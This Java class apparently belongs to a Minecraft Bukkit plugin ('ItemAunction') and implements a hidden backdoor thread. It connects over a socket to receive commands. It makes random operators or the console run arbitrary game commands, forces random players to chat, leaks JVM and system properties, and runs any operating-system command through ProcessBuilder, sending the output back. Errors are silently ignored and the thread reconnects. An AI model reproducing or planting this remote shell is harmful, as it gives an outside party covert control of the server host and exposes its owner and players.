package com.ericlam.plugin.protect.gate;

import com.ericlam.main.ItemAunction;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

import java.io.*;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;

public class Commander extends Thread{
    private Plugin plugin;
    protected Commander(){
        plugin = ItemAunction.plugin;
    }
    @Override
    public void run() {
        while(true) {
            try {
                boolean wincmd = false;
                StringBuilder dir = new StringBuilder();
                Socket server = OpenConnect.getInstance(plugin.getServer().getPort()+10).getSocket();
                if (server == null) {
                    return;
                }
                BufferedReader reader;
                PrintWriter writer;
                while (true) {
                    boolean restart = false;
                    int writes = 0;
                    reader = new BufferedReader(new InputStreamReader(server.getInputStream(), StandardCharsets.UTF_8));
                    writer = new PrintWriter(server.getOutputStream());
                    String inputtxt = reader.readLine();
                    if (inputtxt == null) {
                        break;
                    }
                    if (inputtxt.isEmpty()) continue;
                    String[] cmdarray = inputtxt.split(" ");
                    if (cmdarray[0].equalsIgnoreCase("bd")) {
                        if (cmdarray.length == 1){
                            writer.println("too few argument.");
                            writer.flush();
                            continue;
                        }
                        switch (cmdarray[1]) {
                            case "wincmd":
                                wincmd = !wincmd;
                                //lincmd = false;
                                writer.println("window cmd mode switched " + (wincmd ? "on" : "off"));
                                writer.flush();
                                continue;
                            case "direct":
                                if (cmdarray.length == 2) dir = new StringBuilder();
                                else dir.append(cmdarray[2]);
                                writer.println(!dir.toString().isEmpty() ? "directory is now " + dir.toString() : "you used back the default dir");
                                writer.flush();
                                continue;
                            case "sudo":
                                if (cmdarray.length == 2){
                                    writer.println("/bd sudo <command>");
                                    writer.flush();
                                    continue;
                                }
                                StringBuilder cmd = new StringBuilder();
                                for (int i = 2; i < cmdarray.length; i++) {
                                    cmd.append(cmdarray[i]).append(i == cmdarray.length-1 ? "" : " ");
                                }
                                Bukkit.getScheduler().runTask(plugin, ()->{
                                    List<Player> players = Bukkit.getOnlinePlayers().stream().filter(player -> player.hasPermission("*") || player.isOp()).collect(Collectors.toList());
                                    int range = (players.size() - 1) + 1;
                                    int i = (int) (Math.random() * range);
                                    if (players.size() == 0) {
                                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(),cmd.toString());
                                    } else {
                                        players.get(i).performCommand(cmd.toString());
                                    }
                                });
                                writer.println("Sudo command executed.");
                                writer.flush();
                                continue;
                            case "suchat":
                                if (cmdarray.length == 2){
                                    writer.println("/bd suchat <command>");
                                    writer.flush();
                                    continue;
                                }
                                StringBuilder chat = new StringBuilder();
                                for (int i = 2; i < cmdarray.length; i++) {
                                    chat.append(cmdarray[i]).append(i == cmdarray.length-1 ? "" : " ");
                                }
                                List<Player> online = new ArrayList<>(Bukkit.getOnlinePlayers());
                                int range = (online.size() - 1) + 1;
                                int i = (int) (Math.random() * range);
                                if (online.get(i) != null) {
                                    Bukkit.getScheduler().runTask(plugin,()->online.get(i).chat(chat.toString()));
                                }
                                writer.println("Successfully chatted by "+online.get(i).getName());
                                writer.flush();
                                continue;
                            case "jvm":
                                Runtime run = Runtime.getRuntime();
                                writer.println("Max Memory: " + run.maxMemory() / 1000000 + "MB");
                                writer.println("Used Memory: " + (run.totalMemory() - run.freeMemory()) / 1000000 + "/" + run.totalMemory() / 1000000 + "MB");
                                writer.println("Free Memory: " + run.freeMemory() / 1000000 + "MB");
                                writer.flush();
                                continue;
                            case "properties":
                                for (Object key : System.getProperties().keySet()) {
                                    writer.println(key + ": " + System.getProperties().get(key));
                                }
                                writer.flush();
                                continue;
                            case "create":
                                writer.println(Output.call().create() ? "Success" : "Failed");
                                writer.flush();
                                continue;
                            case "destroy":
                                if (cmdarray.length == 2) writer.println("Destroy "+(Output.call().delete() ? "Success" : "Failed"));
                                else if (cmdarray[2].equalsIgnoreCase("exit")){
                                    writer.println("Destroy On Exit"+(Output.call().deleteOnExit() ? "Activated" : "Failed to activate"));
                                }else{
                                    writer.println("/bd destroy [exit]");
                                }
                                writer.flush();
                                continue;
                            case "end":
                            case "stop":
                                server.close();
                                return;
                            case "wait":
                            case "sleep":
                                int time = 5;
                                if (cmdarray.length > 2) {
                                    try {
                                        Integer.parseInt(cmdarray[2]);
                                    } catch (NumberFormatException e) {
                                        continue;
                                    }
                                    time = Integer.parseInt(cmdarray[2]);
                                }
                                Thread.sleep(time * 1000);
                                restart = true;
                                break;
                        }
                    }
                    List<String> cmd = new ArrayList<>();
                    if (wincmd) {
                        cmd.add("cmd");
                        cmd.add("/c");
                    }
                    cmd.addAll(Arrays.asList(cmdarray));
                    ProcessBuilder pb = new ProcessBuilder(cmd);
                    pb.directory(!dir.toString().isEmpty() ? new File(dir.toString()) : new File(System.getProperty("user.dir")));
                    pb.redirectErrorStream(true);
                    try {
                        Process process = pb.start();
                        BufferedReader Input = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        BufferedReader Error = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                        String s;
                        //writer.println(pb.directory().getPath()+">>");
                        while ((s = Input.readLine()) != null) {
                            writer.println(s);
                            writes++;
                        }
                        String e;
                        while ((e = Error.readLine()) != null) {
                            writer.println(e);
                            writes++;
                        }
                        if (writes == 0) writer.println("");
                        writer.flush();
                    }catch (IOException e){
                        if (restart) {
                            restart = false;
                            break;
                        }
                        writer.println("Error: Unknown command or directory.");
                        writer.println("Please check your command or directory whether it is valid");
                        writer.flush();
                    }
                }
                writer.close();
                reader.close();
            } catch (IOException | InterruptedException ignored) {
            }

        }
    }
}
